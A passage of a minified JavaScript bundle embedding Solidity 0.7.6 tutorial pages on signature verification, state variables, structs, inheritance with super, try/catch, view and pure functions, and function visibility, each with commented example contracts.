class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMessageHash</span>(<span class="hljs-params">\n        <span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _message, <span class="hljs-keyword">uint</span> _nonce\n    </span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>)\n    </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(_to, _amount, _message, _nonce));\n    }\n\n    <span class="hljs-comment">/* 3. Sign message hash\n    # using browser\n    account = "copy paste account of signer here"\n    ethereum.request({ method: "personal_sign", params: [account, hash]}).then(console.log)\n\n    # using web3\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getEthSignedMessageHash</span>(<span class="hljs-params"><span class="hljs-keyword">bytes32</span> _messageHash</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-comment">/*\n        Signature is produced by signing a keccak256 hash with the following format:\n        "\\x19Ethereum Signed Message\\n" + len(msg) + msg\n        */</span>\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-string">"\\x19Ethereum Signed Message:\\n32"</span>, _messageHash));\n    }\n\n    <span class="hljs-comment">/* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = "coffee and donuts"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span>(<span class="hljs-params">\n        <span class="hljs-keyword">address</span> _signer,\n        <span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _message, <span class="hljs-keyword">uint</span> _nonce,\n        <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> signature\n    </span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)\n    </span>{\n        <span class="hljs-keyword">bytes32</span> messageHash = getMessageHash(_to, _amount, _message, _nonce);\n        <span class="hljs-keyword">bytes32</span> ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        <span class="hljs-keyword">return</span> recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">recoverSigner</span>(<span class="hljs-params"><span class="hljs-keyword">bytes32</span> _ethSignedMessageHash, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> _signature</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span></span>)\n    </span>{\n        (<span class="hljs-keyword">bytes32</span> r, <span class="hljs-keyword">bytes32</span> s, <span class="hljs-keyword">uint8</span> v) = splitSignature(_signature);\n\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ecrecover</span>(_ethSignedMessageHash, v, r, s);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">splitSignature</span>(<span class="hljs-params"><span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> sig</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span> r, <span class="hljs-keyword">bytes32</span> s, <span class="hljs-keyword">uint8</span> v</span>)\n    </span>{\n        <span class="hljs-built_in">require</span>(sig.<span class="hljs-built_in">length</span> == <span class="hljs-number">65</span>, <span class="hljs-string">"invalid signature length"</span>);\n\n        <span class="hljs-keyword">assembly</span> {\n            <span class="hljs-comment">/*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */</span>\n\n            <span class="hljs-comment">// first 32 bytes, after the length prefix</span>\n            r := <span class="hljs-built_in">mload</span>(<span class="hljs-built_in">add</span>(sig, <span class="hljs-number">32</span>))\n            <span class="hljs-comment">// second 32 bytes</span>\n            s := <span class="hljs-built_in">mload</span>(<span class="hljs-built_in">add</span>(sig, <span class="hljs-number">64</span>))\n            <span class="hljs-comment">// final byte (first byte of the next 32 bytes)</span>\n            v := <span class="hljs-built_in">byte</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">mload</span>(<span class="hljs-built_in">add</span>(sig, <span class="hljs-number">96</span>)))\n        }\n\n        <span class="hljs-comment">// implicitly return (r, s, v)</span>\n    }\n}\n</code></pre>\n'})};var gs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Reading and Writing to a State Variable",description:"Reading and Writing to a State Variable",html:'<p>To write or update a state variable you need to send a transaction.</p>\n<p>On the other hand, you can read state variables, for free, without any transaction fee.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">SimpleStorage</span> </span>{\n    <span class="hljs-comment">// State variable to store a number</span>\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> num;\n\n    <span class="hljs-comment">// You need to send a transaction to write to a state variable.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        num = _num;\n    }\n\n    <span class="hljs-comment">// You can read from a state variable without sending a transaction.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> num;\n    }\n}\n</code></pre>\n'})};var _s=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Structs",description:"An example of how to use structs in Solidity",html:'<p>You can define your own type by creating a <code>struct</code>.</p>\n<p>They are useful for grouping togther related data.</p>\n<p>Structs can be declared outside of a contract and imported in another contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Todos</span> </span>{\n    <span class="hljs-keyword">struct</span> <span class="hljs-title">Todo</span> {\n        <span class="hljs-keyword">string</span> text;\n        <span class="hljs-keyword">bool</span> completed;\n    }\n\n    <span class="hljs-comment">// An array of &#x27;Todo&#x27; structs</span>\n    Todo[] <span class="hljs-keyword">public</span> todos;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _text</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// 3 ways to initialize a struct</span>\n        <span class="hljs-comment">// - calling it like a function</span>\n        todos.<span class="hljs-built_in">push</span>(Todo(_text, <span class="hljs-literal">false</span>));\n\n        <span class="hljs-comment">// key value mapping</span>\n        todos.<span class="hljs-built_in">push</span>(Todo({\n            text: _text,\n            completed: <span class="hljs-literal">false</span>\n        }));\n\n        <span class="hljs-comment">// initialize an emoty struct and then update it</span>\n        Todo <span class="hljs-keyword">memory</span> todo;\n        todo.text = _text;\n        <span class="hljs-comment">// todo.completed initialized to false</span>\n\n        todos.<span class="hljs-built_in">push</span>(todo);\n    }\n\n    <span class="hljs-comment">// Solidity automatically created a getter for&#x27; todos&#x27; so</span>\n    <span class="hljs-comment">// you don&#x27;t actually need this function.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _index</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span>\n        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> text, <span class="hljs-keyword">bool</span> completed</span>)\n    </span>{\n        Todo <span class="hljs-keyword">storage</span> todo = todos[_index];\n        <span class="hljs-keyword">return</span> (todo.text, todo.completed);\n    }\n\n    <span class="hljs-comment">// update text</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _index, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _text</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        Todo <span class="hljs-keyword">storage</span> todo = todos[_index];\n        todo.text = _text;\n    }\n    <span class="hljs-comment">// update completed</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toggleCompleted</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _index</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        Todo <span class="hljs-keyword">storage</span> todo = todos[_index];\n        todo.completed = !todo.completed;\n    }\n}\n</code></pre>\n<h3 id="declaring-and-importing-struct">Declaring and importing Struct</h3>\n<p>File that the struct is declared in</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">struct</span> <span class="hljs-title">Todo</span> {\n    <span class="hljs-keyword">string</span> text;\n    <span class="hljs-keyword">bool</span> completed;\n}</code></pre>\n<p>File that imports the struct above</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"./StructDeclaration.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Todos</span> </span>{\n    <span class="hljs-comment">// An array of &#x27;Todo&#x27; structs</span>\n    Todo[] <span class="hljs-keyword">public</span> todos;\n}</code></pre>\n'})};var vs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Calling Parent Contracts",description:"An example of calling parent contracts in Solidity",html:'<p>Parent contracts can be called directly, or by using the keyword <code>super</code>.</p>\n<p>By using the keyword <code>super</code>, all of the immediate parent contracts will be called.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/* Inheritance tree\n   A\n /  \\\nB   C\n \\ /\n  D\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-comment">// This is called an event. You can emit events from your function</span>\n    <span class="hljs-comment">// and they are logged into the transaction log.</span>\n    <span class="hljs-comment">// In our case, this will be useful for tracing function calls.</span>\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> message</span>)</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"A.foo called"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"A.bar called"</span>);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">B</span> <span class="hljs-keyword">is</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"B.foo called"</span>);\n        A.foo();\n    }\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"B.bar called"</span>);\n        <span class="hljs-built_in">super</span>.bar();\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">C</span> <span class="hljs-keyword">is</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"C.foo called"</span>);\n        A.foo();\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"C.bar called"</span>);\n        <span class="hljs-built_in">super</span>.bar();\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">D</span> <span class="hljs-keyword">is</span> <span class="hljs-title">B</span>, <span class="hljs-title">C</span> </span>{\n    <span class="hljs-comment">// Try:</span>\n    <span class="hljs-comment">// - Call D.foo and check the transaction logs.</span>\n    <span class="hljs-comment">//   Although D inherits A, B and C, it only called C and then A.</span>\n    <span class="hljs-comment">// - Call D.bar and check the transaction logs</span>\n    <span class="hljs-comment">//   D called C, then B, and finally A.</span>\n    <span class="hljs-comment">//   Although super was called twice (by B and C) it only called A once.</span>\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span>(<span class="hljs-params">B, C</span>) </span>{\n        <span class="hljs-built_in">super</span>.foo();\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span>(<span class="hljs-params">B, C</span>) </span>{\n        <span class="hljs-built_in">super</span>.bar();\n    }\n}\n</code></pre>\n'})};var xs=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Try Catch",description:"An example of try / catch in Solidity",html:'<p><code>try / catch</code> can only catch errors from external function calls and contract creation.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// External contract used for try / catch examples</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Foo</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> _owner</span>) </span>{\n        <span class="hljs-built_in">require</span>(_owner != <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">"invalid address"</span>);\n        <span class="hljs-built_in">assert</span>(_owner != <span class="hljs-number">0x0000000000000000000000000000000000000001</span>);\n        owner = _owner;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunc</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-built_in">require</span>(x != <span class="hljs-number">0</span>, <span class="hljs-string">"require failed"</span>);\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"my func was called"</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bar</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> message</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">LogBytes</span>(<span class="hljs-params"><span class="hljs-keyword">bytes</span> data</span>)</span>;\n\n    Foo <span class="hljs-keyword">public</span> foo;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-comment">// This Foo contract is used for example of try catch with external call</span>\n        foo = <span class="hljs-keyword">new</span> Foo(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);\n    }\n\n    <span class="hljs-comment">// Example of try / catch with external call</span>\n    <span class="hljs-comment">// tryCatchExternalCall(0) =&gt; Log("external call failed")</span>\n    <span class="hljs-comment">// tryCatchExternalCall(1) =&gt; Log("my func was called")</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tryCatchExternalCall</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">try</span> foo.myFunc(_i) <span class="hljs-keyword">returns</span> (<span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> result) {\n            <span class="hljs-keyword">emit</span> Log(result);\n        } <span class="hljs-keyword">catch</span> {\n            <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"external call failed"</span>);\n        }\n    }\n\n    <span class="hljs-comment">// Example of try / catch with contract creation</span>\n    <span class="hljs-comment">// tryCatchNewContract(0x0000000000000000000000000000000000000000) =&gt; Log("invalid address")</span>\n    <span class="hljs-comment">// tryCatchNewContract(0x0000000000000000000000000000000000000001) =&gt; LogBytes("")</span>\n    <span class="hljs-comment">// tryCatchNewContract(0x0000000000000000000000000000000000000002) =&gt; Log("Foo created")</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tryCatchNewContract</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _owner</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">try</span> <span class="hljs-keyword">new</span> Foo(_owner) <span class="hljs-keyword">returns</span> (Foo foo) {\n            <span class="hljs-comment">// you can use variable foo here</span>\n            <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"Foo created"</span>);\n        } <span class="hljs-keyword">catch</span> <span class="hljs-built_in">Error</span>(<span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> reason) {\n            <span class="hljs-comment">// catch failing revert() and require()</span>\n            <span class="hljs-keyword">emit</span> Log(reason);\n        } <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> reason) {\n            <span class="hljs-comment">// catch failing assert()</span>\n            <span class="hljs-keyword">emit</span> LogBytes(reason);\n        }\n    }\n}</code></pre>\n'})};var Ss=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Variables",description:"Local, state and global variables",html:'<p>There are 3 types of variables in Solidity</p>\n<ul>\n<li><strong>local</strong><ul>\n<li>declared inside a function</li>\n<li>not stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>state</strong><ul>\n<li>declared outside a function</li>\n<li>stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>global</strong> (provides information about the blockchain)</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Variables</span> </span>{\n    <span class="hljs-comment">// State variables are stored on the blockchain.</span>\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> text = <span class="hljs-string">"Hello"</span>;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> num = <span class="hljs-number">123</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Local variables are not saved to the blockchain.</span>\n        <span class="hljs-keyword">uint</span> i = <span class="hljs-number">456</span>;\n\n        <span class="hljs-comment">// Here are some global variables</span>\n        <span class="hljs-keyword">uint</span> timestamp = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>; <span class="hljs-comment">// Current block timestamp</span>\n        <span class="hljs-keyword">address</span> sender = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>; <span class="hljs-comment">// address of the caller</span>\n    }\n}\n</code></pre>\n'})};var Es=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"View and Pure Functions",description:"An example of view and pure functions in Solidity",html:'<p>Getter functions can be declared <code>view</code> or <code>pure</code>.</p>\n<p><code>View</code> function declares that no state will be changed.</p>\n<p><code>Pure</code> function declares that no state variable will be changed or read.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ViewAndPure</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> x = <span class="hljs-number">1</span>;\n\n    <span class="hljs-comment">// Promise not to modify the state.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addToX</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> y</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> x + y;\n    }\n\n    <span class="hljs-comment">// Promise not to modify or read from the state.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> i, <span class="hljs-keyword">uint</span> j</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> i + j;\n    }\n}\n</code></pre>\n'})};var As=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Visibility",description:"An example of external, internal, private and public functions in Solidity",html:'<p>Functions and state variables have to declare whether they are accessible by other contracts.</p>\n<p>Fucntions can be declared as</p>\n<ul>\n<li><code>public</code> - any contract and account can call</li>\n<li><code>private</code> - only inside the contract that defines the function</li>\n<li><code>internal</code>- only inside contract that inherits an <code>internal</code> function</li>\n<li><code>external</code> - only other contracts and accounts can call</li>\n</ul>\n<p>State variables can be declared as <code>public</code>, <code>private</code>, or <code>internal</code> but not <code>external</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Base</span> </span>{\n    <span class="hljs-comment">// Private function can only be called</span>\n    <span class="hljs-comment">// - inside this contract</span>\n    <span class="hljs-comment">// Contracts that inherit this contract cannot call this function.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">privateFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"private function called"</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testPrivateFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> privateFunc();\n    }\n\n    <span class="hljs-comment">// Internal function can be called</span>\n    <span class="hljs-comment">// - inside this contract</span>\n    <span class="hljs-comment">// - inside contracts that inherit this contract</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">internalFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"internal function called"</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testInternalFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> internalFunc();\n    }\n\n    <span class="hljs-comment">// Public functions can be called</span>\n    <span class="hljs-comment">// - inside this contract</span>\n    <span class="hljs-comment">// - inside contracts that inherit this contract</span>\n    <span class="hljs-comment">// - by other contracts and accounts</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">publicFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"public function called"</span>;\n    }\n\n    <span class="hljs-comment">// External functions can only be called</span>\n    <span class="hljs-comment">// - by other contracts and accounts</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">externalFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-string">"external function called"</span>;\n    }\n\n    <span class="hljs-comment">// This function will not compile since we&#x27;re trying 